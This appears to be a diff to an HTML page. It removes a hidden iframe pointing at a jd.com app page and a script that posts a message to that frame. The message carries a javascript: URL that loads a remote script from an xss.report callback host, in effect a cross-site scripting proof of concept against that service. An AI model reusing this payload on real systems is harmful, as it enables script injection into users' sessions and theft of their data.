@@ -106,14 +106,9 @@
             
             
         </div>
-	<iframe id="bFrame" src="https://jxsaasapp.m.jd.com/404" width="0" height="0"></iframe>
+	
     </body>
    
   
-  <script>
-    document.getElementById('bFrame').onload = () => {
-      const iframe = document.getElementById('bFrame');
-      iframe.contentWindow.postMessage({callbackName:'openBrowserPage',nodeId:'root',objArgs:{url:'javascript:var a=document.createElement("script");a.src="https://xss.report/c/cssxn";document.body.appendChild(a);'}}, '*');
-    };
-  </script>
+
 </html>
